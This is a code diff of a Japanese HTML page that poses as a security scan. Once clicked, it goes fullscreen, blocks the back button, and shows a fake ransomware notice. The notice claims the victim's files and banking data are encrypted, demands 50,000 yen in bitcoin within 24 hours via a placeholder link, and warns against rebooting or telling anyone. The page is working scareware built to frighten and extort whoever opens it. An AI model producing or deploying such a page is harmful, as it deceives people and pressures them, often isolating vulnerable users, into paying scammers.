@@ -2,107 +2,68 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>セキュリティ警告</title>
+  <title>⚠️ セキュリティ警告</title>
   <style>
     body {
-      background: black;
+      background-color: black;
       color: red;
-      font-family: 'Courier New', monospace;
+      font-family: 'Segoe UI', sans-serif;
       text-align: center;
-      overflow: hidden;
-      animation: bgFlash 1s infinite alternate;
+      padding: 100px 30px;
     }
-
-    @keyframes bgFlash {
-      0% { background: black; }
-      100% { background: darkred; }
+    #message {
+      font-size: 22px;
+      line-height: 2;
+      white-space: pre-wrap;
+      margin-top: 50px;
     }
-
-    h1, p {
-      margin: 20px;
-      font-size: 2em;
-    }
-
-    .glitch {
-      animation: glitch 0.3s infinite;
-    }
-
-    @keyframes glitch {
-      0% { transform: translate(1px, -1px); }
-      25% { transform: translate(-1px, 1px); }
-      50% { transform: translate(1px, 1px); }
-      75% { transform: translate(-1px, -1px); }
-      100% { transform: translate(0, 0); }
-    }
-
-    #countdown {
-      font-size: 3em;
-      font-weight: bold;
-    }
-
     button {
-      padding: 10px 20px;
-      font-size: 1.2em;
-      background: red;
+      padding: 12px 24px;
+      font-size: 18px;
+      background-color: red;
       color: white;
       border: none;
       cursor: pointer;
     }
+    button:hover {
+      background-color: darkred;
+    }
   </style>
 </head>
 <body>
-  <h1 id="message">スキャン中...</h1>
-  <button onclick="startRansom()">スキャンを続行</button>
+  <h1>スキャン中…</h1>
+  <button onclick="showWarning()">スキャンを続行</button>
+  <div id="message"></div>
 
   <script>
-    // 無限戻り防止
+    // 戻る防止
     history.pushState(null, null, location.href);
     window.onpopstate = () => history.go(1);
 
-    const ransomMessage = [
-      "⚠️ システムが重大なウイルスに感染しました。",
-      "💀 全ファイルは暗号化されました。",
-      "🧨 復旧するには身代金が必要です。",
-      "⏳ 制限時間以内に支払わないと全データは消去されます。",
-      "🪙 0.01 BTC を以下のウォレットに送ってください。",
-      "→ bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-      "⌛ タイマー："
-    ];
-
-    let i = 0;
-    let message = document.getElementById("message");
-
-    function typeMessage() {
-      if (i < ransomMessage.length) {
-        message.innerHTML = ransomMessage[i];
-        i++;
-        setTimeout(typeMessage, 2000);
-      } else {
-        startCountdown();
-      }
-    }
-
-    function startRansom() {
+    function showWarning() {
       document.documentElement.requestFullscreen();
       document.querySelector("button").style.display = "none";
-      message.classList.add("glitch");
-      setTimeout(typeMessage, 1000);
-    }
+      document.querySelector("h1").style.display = "none";
 
-    function startCountdown() {
-      const countdown = document.createElement("div");
-      countdown.id = "countdown";
-      document.body.appendChild(countdown);
+      const content = `
+⚠️ 緊急警告：あなたのデバイスは深刻なセキュリティリスクに晒されています。
 
-      let time = 60; // 60秒カウントダウン
-      const timer = setInterval(() => {
-        countdown.textContent = time + " 秒";
-        time--;
-        if (time < 0) {
-          clearInterval(timer);
-          countdown.textContent = "💣 ファイルは削除されました。";
-        }
-      }, 1000);
+💀 システム全体が感染し、個人ファイル・パスワード・写真・銀行情報などが完全に暗号化されました。
+
+🛑 復元を希望する場合、下記の指示に従ってください。
+
+🪙 支払金額: 50,000円相当のビットコイン  
+⏳ 支払い期限: 24時間以内（超過後、すべてのデータは完全削除されます）
+
+📥 振込先:  
+https://ransom.fake-btc-wallet.com
+
+🔒 注意：自己判断による電源オフ、再起動、他人への相談は復元を不可能にし、ファイルが即座に破壊されます。
+
+復号キーを取得するまで、あなたのデバイスは完全に監視・制限されています。
+      `;
+
+      document.getElementById("message").innerText = content;
     }
   </script>
 </body>
